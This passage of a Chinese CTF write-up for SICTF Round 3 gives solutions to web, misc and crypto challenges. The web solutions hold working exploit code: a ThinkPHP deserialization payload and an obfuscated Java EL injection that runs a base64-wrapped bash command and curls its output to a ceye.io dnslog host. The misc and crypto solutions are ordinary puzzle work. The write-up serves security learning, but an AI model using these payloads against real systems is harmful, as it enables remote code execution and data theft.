class="string">&quot;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url,data).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>成功得到flag。</p><p><img src="/./SICTF_Round3/w_5_1.png"></p><h2 id="进阶-elInjection"><a href="#进阶-elInjection" class="headerlink" title="[进阶]elInjection"></a>[进阶]elInjection</h2><p>题目说明了是elInjection。</p><p>先测试，输入<code>$&#123;null==null&#125;</code>，发现能原样输出，输入<code>$&#123;null1==null&#125;</code>，发现报错了，这里猜测代码能正确执行就会返回输入的值。</p><p>参考链接：<a href="https://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">（先知首发）浅析EL表达式注入漏洞</a></p><p>​<a href="https://j0k3r.top/2020/08/13/java-expression/#0x03-EL-%E6%B3%A8%E5%85%A5">Java EL （Expression Language）表达式注入</a></p><p>因为过滤了<code>invoke</code>，所以不能用反射来绕。</p><p>我们可以利用ScriptEngine调用JS引擎绕过，但是后边发现没能执行成功，<code>getRuntime</code> 被过滤了。</p><p>通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤。</p><p>dnslog能回显，通过dnslog实现外带</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">payload</span>):</span><br><span class="line">encode_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload)):</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">encode_payload += <span class="string">&quot;true.toString().charAt(0).toChars(%d)[0].toString()&quot;</span> % <span class="built_in">ord</span>(payload[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">encode_payload += <span class="string">&quot;.concat(true.toString().charAt(0).toChars(%d)[0].toString())&quot;</span> % <span class="built_in">ord</span>(payload[i])</span><br><span class="line"><span class="keyword">return</span> encode_payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里填命令</span></span><br><span class="line">cmd = <span class="string">b&quot;curl `/readflag`.kbqsag.ceye.io&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(base64.b64encode(cmd))</span></span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;$&#123;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(%s)&#125;&#x27;</span> % (encode(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&quot;</span>+base64.b64encode(cmd).decode()+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;)&quot;</span>))</span><br><span class="line"><span class="comment">#print(exp)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://yuanshen.life:23333/test&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;exp&#x27;</span>: exp&#125;</span><br><span class="line">r = requests.post(url, data).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>一开始不知道有<code>/readflag</code>，用grep找根目录有<code>f</code>的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = b&quot;curl `ls /|grep &#x27;f&#x27;`.kbqsag.ceye.io&quot;</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_6_1.png"></p><p>得知有一个<code>readflag</code>，运行它即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = b&quot;curl `/readflag`.kbqsag.ceye.io&quot;</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_6_2.png"></p><p>把<code>SICTF</code>大写，剩下的小写，补上大括号即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;64177ed4-9254-dc2f-8d30-88aaef1b8264&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="GeekChallege"><a href="#GeekChallege" class="headerlink" title="GeekChallege"></a>GeekChallege</h2><p>猜密码，还不能按字符全猜，得一个一个猜</p><p>把出现的字符放在<code>dic</code>前面，加快速度。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;yuanshen.life&quot;</span>,<span class="number">34905</span>)</span><br><span class="line">dic=string.printable</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">pwd = <span class="string">&quot;&quot;</span></span><br><span class="line">pwdlen = <span class="number">113</span></span><br><span class="line">lst=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">114</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,pwd)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = pwd + j + <span class="string">&#x27;0&#x27;</span>*(pwdlen-<span class="built_in">len</span>(pwd))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        a = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span>*(<span class="built_in">len</span>(pwd)+<span class="number">1</span>) <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                lst += j</span><br><span class="line">                dic = j + dic</span><br><span class="line">            pwd += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="真💨签到"><a href="#真💨签到" class="headerlink" title="真💨签到"></a>真💨签到</h2><p>zip尾端有一串字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5456545454565458414259555854585458434152595958415a435959595558563d</span><br></pre></td></tr></table></figure><p>hex解码后得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TVTTTVTXABYUXTXTXCARYYXAZCYYYUXV=</span><br></pre></td></tr></table></figure><p>文本加密字母解码，得到压缩包密码。</p><p>在线网站：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu#:~:text=%E6%96%87%E6%9C%AC%E5%8A%A0%E5%AF%86%E4%B8%BA%E5%AD%97%E6%AF%8D%20%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81%20%E5%8A%A0%E5%AF%86,%EF%BC%9A%E6%96%87%E6%9C%AC%E6%A1%86%E8%BE%93%E5%85%A5%E5%8E%9F%E5%A7%8B%E6%96%87%E6%9C%AC%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81%E5%88%99%E5%9C%A8%E5%AF%86%E7%A0%81%E6%A1%86%E4%B8%AD%E8%AE%BE%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%AF%86%E7%A0%81%EF%BC%8C%E7%82%B9%E5%87%BB%E5%8A%A0%E5%AF%86%E6%8C%89%E9%92%AE%EF%BC%8C%E4%B8%8B%E6%96%B9%E5%B0%86%E6%98%BE%E7%A4%BA%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E6%96%87%E6%9C%AC%E3%80%82%20%E8%A7%A3%E5%AF%86%20%EF%BC%9A%E6%96%87%E6%9C%AC%E6%A1%86%E8%BE%93%E5%85%A5%E5%8A%A0%E5%AF%86%E6%96%87%E6%9C%AC%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%AF%86%E7%A0%81%E5%88%99%E5%9C%A8%E5%AF%86%E7%A0%81%E6%A1%86%E4%B8%AD%E8%BE%93%E5%85%A5%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A0%81%EF%BC%8C%E7%82%B9%E5%87%BB%E8%A7%A3%E5%AF%86%E6%8C%89%E9%92%AE%EF%BC%8C%E4%B8%8B%E6%96%B9%E5%B0%86%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E6%96%87%E6%9C%AC%E3%80%82">文本加密为字母</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024HappyNewYear</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/m_2_1.png"></p><p>解压后分析音频，降低采样率，可以看到密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">givemeyourlagrange</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/m_2_2.png"></p><p>最后是音频的文件名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LagrangeisCapatlized</span><br></pre></td></tr></table></figure><p>分离一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Lagrange is Capatlized</span><br></pre></td></tr></table></figure><p>提示得到的密钥中 <code>Lagrange</code> 要大写。（出题人把 <code>Capatlized</code>写错了-_-!）</p><p>最终密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">givemeyourLAGRANGE</span><br></pre></td></tr></table></figure><p><code>steghide</code>解jpg，即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;T3e_endless_Lagrange_is_really_fun!&#125;</span><br></pre></td></tr></table></figure><h2 id="WHO-WHO-WHO"><a href="#WHO-WHO-WHO" class="headerlink" title="WHO?WHO?WHO"></a>WHO?WHO?WHO</h2><p>用<code>rockyou.txt</code>字典爆破压缩包密码，得到密码为<code>qweqwe</code>。</p><p><img src="/./SICTF_Round3/m_3_1.png"></p><p>解压后发现字符长度不对，猜测零宽隐写，找个在线网站解了。</p><p>网站：<a href="https://yuanfux.github.io/zero-width-web/"><strong>zero-width-lib</strong></a></p><p><img src="/./SICTF_Round3/m_3_2.png"></p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K+/0J16ELU8WVQydohw4P5+2MjbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL/WP4PCMaOJHAW3HRb7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE=</span><br></pre></td></tr></table></figure><p>猜测是<code>rabbit</code>加密，密钥猜是<code>shumu</code>，发现能解。</p><p>网站：<a href="https://tool.oschina.net/encrypt/">在线加密解密(采用实现)</a></p><p><img src="/./SICTF_Round3/m_3_3.png"></p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;</span><br></pre></td></tr></table></figure><p>DNA加密，去找个脚本修改一下</p><p>网站：<a href="https://github.com/karma9874/DNA-Cipher-Script-CTF">DNA-Cipher-Script-CTF</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">mapping = &#123;</span><br><span class="line">        <span class="string">&#x27;AAA&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;AAC&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;AAG&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;AAT&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;ACA&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;ACC&#x27;</span>:<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;ACG&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;ACT&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;AGA&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;AGC&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;AGG&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;AGT&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;ATA&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;ATC&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;ATG&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;ATT&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;CAA&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;CAC&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;CAG&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;CAT&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;CCA&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;CCC&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;CCG&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;CCT&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;CGA&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;CGC&#x27;</span>:<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;CGG&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;CGT&#x27;</span>:<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;CTA&#x27;</span>:<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;CTC&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;CTG&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;CTT&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;GAA&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;GAC&#x27;</span>:<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;GAG&#x27;</span>:<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;GAT&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;GCA&#x27;</span>:<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;GCC&#x27;</span>:<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;GCG&#x27;</span>:<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;GCT&#x27;</span>:<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;GGA&#x27;</span>:<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;GGC&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;GGG&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;GGT&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;GTA&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;GTC&#x27;</span>:<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;GTG&#x27;</span>:<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;GTT&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;TAA&#x27;</span>:<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;TAC&#x27;</span>:<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;TAG&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;TAT&#x27;</span>:<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;TCA&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;TCC&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;TCG&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;TCT&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;TGA&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;TGC&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;TGG&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;TGT&#x27;</span>:<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;TTA&#x27;</span>:<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;TTC&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;TTG&#x27;</span>:<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;TTT&#x27;</span>:<span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_dna</span>(<span class="params">string</span>):</span><br><span class="line">    final=<span class="string">&quot;&quot;</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;<span class="built_in">len</span>(string):</span><br><span class="line">        final+=mapping[string[i:i+<span class="number">3</span>]]</span><br><span class="line">        i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> string[i]==<span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> string[i]==<span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> string[i]==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            final+=string[i]</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">input_string = <span class="string">&quot;GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = decode_dna(input_string)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">datas = [input_string.split(&#x27;&#123;&#x27;)[0]]+input_string.split(&#x27;&#123;&#x27;)[1][:-1].split(&#x27;_&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag=&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in datas:</span></span><br><span class="line"><span class="string">    flag+=decode_dna(i)+&#x27;_&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SICTF&#123;Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN&#125;</span></span><br></pre></td></tr></table></figure><h2 id="日志分析2"><a href="#日志分析2" class="headerlink" title="日志分析2"></a>日志分析2</h2><p>ip地址在<code>error.log1</code>里能发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.11.35.95</span><br></pre></td></tr></table></figure><p>观察<code>access.log.1</code>，在login的时候有大量重复请求发现，应该是在爆破密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">暴力破解</span><br></pre></td></tr></table></figure><p>搜索<code>sql</code>，可以看到sqlmap和它的版本号。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap 1.2.4.18</span><br></pre></td></tr></table></figure><p>最后一个是猜用了蚁剑，搜<code>ant</code>，果然是蚁剑，得到名称和版本号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">antSword/v2.1</span><br></pre></td></tr></table></figure><p>最后的flag：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;10.11.35.95|暴力破解|sqlmap|1.2.4.18|蚁剑|2.1&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="签到-Vigenere"><a href="#签到-Vigenere" class="headerlink" title="[签到]Vigenere"></a>[签到]Vigenere</h2><p>在线网站爆破即可</p><p>在线网站：<a href="https://www.guballa.de/vigenere-solver">Vigenère Solver</a></p><p><img src="/./SICTF_Round3/c_1_1.png"></p><h2 id="SuperbRSA"><a href="#SuperbRSA" class="headerlink" title="SuperbRSA"></a>SuperbRSA</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#user:mumu666</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e1=<span class="number">55</span></span><br><span class="line">e2=<span class="number">200</span></span><br><span class="line">m=bytes_to_long(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(m,<span class="number">5</span>) &lt; n)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line">n= <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1= <span class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2= <span class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>共模攻击，解出m后开5次方。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n= <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1= <span class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2= <span class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line">e1=<span class="number">55</span></span><br><span class="line">e2=<span class="number">200</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n))%n</span><br><span class="line">m = gmpy2.iroot(m,s)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># SICTF&#123;S0_Great_RSA_Have_Y0u_Learned?&#125;</span></span><br></pre></td></tr></table></figure><h2 id="gggcccddd"><a href="#gggcccddd" class="headerlink" title="gggcccddd"></a>gggcccddd</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(<span class="number">233</span>*m+<span class="number">9527</span>,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191</span></span><br><span class="line"><span class="string">c1 = 60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684</span></span><br><span class="line"><span class="string">c2 = 20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>Franklin-Reiter attack，套板子用sage硬跑出来，要等很久。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191</span></span><br><span class="line">c1 = <span 